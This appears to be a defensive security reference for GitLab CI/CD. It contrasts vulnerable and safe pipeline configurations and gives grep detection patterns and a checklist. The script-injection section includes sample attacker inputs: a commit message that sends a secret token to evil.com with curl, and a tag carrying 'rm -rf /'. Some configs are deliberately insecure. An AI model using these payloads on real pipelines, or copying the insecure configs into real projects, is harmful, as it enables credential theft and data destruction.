# GitLab CI/CD Security Reference

## Overview

GitLab CI/CD pipelines execute arbitrary code with access to secrets, infrastructure, and deployment targets. Misconfigurations can leak credentials, allow code injection, or grant attackers access to production environments.

---

## Secrets in Pipelines

```yaml
# VULNERABLE: Hardcoded secrets in .gitlab-ci.yml
variables:
  DB_PASSWORD: "mysecretpassword"
  API_KEY: "sk-12345"

# VULNERABLE: Secrets echoed in logs
script:
  - echo $SECRET_TOKEN  # Visible in job logs
  - curl -H "Authorization: Bearer $API_KEY" https://api.example.com | tee output.log

# SAFE: Use CI/CD variables (Settings > CI/CD > Variables)
# Mark as: Protected (only on protected branches) + Masked (hidden in logs)
script:
  - curl -H "Authorization: Bearer $API_KEY" https://api.example.com > /dev/null
```

### Variable Configuration

| Setting | Purpose | When to Use |
|---------|---------|-------------|
| **Protected** | Only available on protected branches/tags | Production secrets, deploy keys |
| **Masked** | Hidden in job logs | All secrets (tokens, passwords, keys) |
| **File** | Written to a file instead of env var | Certificates, service account JSON |

```yaml
# VULNERABLE: Unmasked variable visible in logs
variables:
  DEPLOY_TOKEN: $CI_DEPLOY_TOKEN  # Not masked — visible if script echoes it

# FLAG: Variables without both Protected and Masked for sensitive values
```

---

## Script Injection

Attacker-controlled CI variables used in `script:` blocks can execute arbitrary commands.

### Attacker-Controlled CI Variables

| Variable | Source | Risk |
|----------|--------|------|
| `$CI_COMMIT_MESSAGE` | Git commit message | Any contributor |
| `$CI_COMMIT_TITLE` | First line of commit message | Any contributor |
| `$CI_MERGE_REQUEST_TITLE` | MR title | MR author |
| `$CI_MERGE_REQUEST_DESCRIPTION` | MR description | MR author |
| `$CI_COMMIT_TAG` | Git tag name | Tag creator |
| `$CI_COMMIT_REF_NAME` | Branch/tag name | Branch creator |

```yaml
# VULNERABLE: Unescaped variable in script
script:
  - echo "Building $CI_COMMIT_MESSAGE"  # Injection via commit message
  # Attacker commit message: "; curl http://evil.com/steal?token=$SECRET"

# VULNERABLE: Variable in shell command
script:
  - git tag -a "$CI_COMMIT_TAG" -m "Release $CI_COMMIT_TAG"
  # Attacker tag: "; rm -rf /"

# SAFE: Use server-controlled variables instead of attacker-controlled ones
script:
  - echo "Building commit ${CI_COMMIT_SHORT_SHA}"  # Server-controlled, safe
  - echo "Pipeline for ${CI_PROJECT_NAME}"          # Server-controlled, safe
  # Avoid CI_COMMIT_MESSAGE, CI_COMMIT_TITLE, CI_MERGE_REQUEST_TITLE in scripts
```

---

## Artifact Security

```yaml
# VULNERABLE: Sensitive data in artifacts (accessible to anyone with project access)
artifacts:
  paths:
    - .env
    - credentials.json
    - coverage/  # May contain source code paths

# VULNERABLE: Public artifacts on public projects
artifacts:
  public: true  # Default for public projects — anyone can download

# SAFE: Restrict artifact content and access
artifacts:
  paths:
    - build/
    - test-results/
  expire_in: 1 week
  access: developer  # GitLab 15.9+: restrict to specific roles
```

---

## Runner Security

```yaml
# VULNERABLE: Shared runners with privileged Docker executor
# Shared runners may execute untrusted code from forks

# FLAG: privileged mode in runner config (config.toml)
# [runners.docker]
#   privileged = true  # Container can escape to host

# SAFE: Project-specific runners for sensitive jobs
deploy:
  tags:
    - project-specific
    - no-shared
  script:
    - deploy.sh

# SAFE: Protected runners for protected branches only
# Configure in Settings > CI/CD > Runners > Edit > Protected
```

---

## Include/Extend Risks

```yaml
# VULNERABLE: Including from untrusted external sources
include:
  - remote: 'https://untrusted-site.com/ci-template.yml'

# VULNERABLE: Including from public repos without pinning
include:
  - project: 'some-group/templates'
    ref: main  # Could change at any time
    file: 'ci-template.yml'

# SAFE: Pin includes to specific commit SHA
include:
  - project: 'my-group/ci-templates'
    ref: 'abc123def456'  # Pinned to known-good commit
    file: 'ci-template.yml'

# SAFE: Local includes (same repo)
include:
  - local: '.gitlab/ci/build.yml'
```

---

## Permissions

```yaml
# VULNERABLE: CI_JOB_TOKEN with broad scope
# Default CI_JOB_TOKEN can access other projects — restrict in Settings

# CHECK: Token scope in Settings > CI/CD > Token Access
# Limit which projects can use this project's CI_JOB_TOKEN

# VULNERABLE: Deploy keys with write access on non-protected branches
# Deploy keys should be read-only unless writing is required

# SAFE: Restrict pipeline creation to protected branches
# Use "protected" variables and "protected" runners

# SAFE: Require approval for MR pipelines from forks
# Settings > General > Merge requests > "Pipelines must succeed"
# Settings > CI/CD > General pipelines > "Protected" fork pipelines
```

---

## Docker-in-Docker

```yaml
# VULNERABLE: DinD with privileged mode
services:
  - docker:dind
variables:
  DOCKER_HOST: tcp://docker:2375  # Unencrypted
script:
  - docker build -t myimage .

# VULNERABLE: Mounting Docker socket
services:
  - name: docker:dind
    command: ["--host=tcp://0.0.0.0:2375"]  # No TLS
variables:
  DOCKER_HOST: tcp://docker:2375

# SAFE: Use Kaniko for unprivileged image builds
build:
  image:
    name: gcr.io/kaniko-project/executor:debug
    entrypoint: [""]
  script:
    - /kaniko/executor --context $CI_PROJECT_DIR --destination $CI_REGISTRY_IMAGE:$CI_COMMIT_TAG

# SAFE: DinD with TLS
services:
  - docker:dind
variables:
  DOCKER_HOST: tcp://docker:2376
  DOCKER_TLS_CERTDIR: "/certs"
  DOCKER_TLS_VERIFY: 1
```

---

## Grep Patterns

```bash
# Hardcoded secrets in CI config
grep -rn "password\|secret\|api_key\|token.*=" --include=".gitlab-ci.yml" --include="*.yml" .gitlab/

# Script injection (attacker-controlled variables in scripts)
grep -rn "CI_COMMIT_MESSAGE\|CI_COMMIT_TITLE\|CI_MERGE_REQUEST_TITLE\|CI_MERGE_REQUEST_DESCRIPTION" --include=".gitlab-ci.yml"

# Echoing secrets
grep -rn "echo.*\$\|tee\|>.*log" --include=".gitlab-ci.yml" | grep -i "token\|secret\|key\|pass"

# Unpinned remote includes
grep -rn "remote:" --include=".gitlab-ci.yml"

# Privileged Docker
grep -rn "privileged\|docker:dind\|DOCKER_HOST" --include=".gitlab-ci.yml"

# Public artifacts
grep -rn "public: true" --include=".gitlab-ci.yml"

# Sensitive files in artifacts
grep -A5 "artifacts:" --include=".gitlab-ci.yml" | grep "\.env\|credentials\|\.pem\|\.key"
```

---

## Testing Checklist

- [ ] No hardcoded secrets in `.gitlab-ci.yml`
- [ ] All sensitive variables marked as Protected + Masked
- [ ] No attacker-controlled variables used unescaped in `script:` blocks
- [ ] No sensitive data in artifacts
- [ ] Remote includes pinned to specific commit SHA
- [ ] `CI_JOB_TOKEN` scope restricted
- [ ] Privileged Docker mode justified or replaced with Kaniko
- [ ] DinD uses TLS when required
- [ ] Fork pipelines require approval
- [ ] Deploy keys are read-only unless write is explicitly needed

---

## References

- [GitLab CI/CD Security](https://docs.gitlab.com/ee/ci/security/)
- [OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
- [GitLab Runner Security](https://docs.gitlab.com/runner/security/)
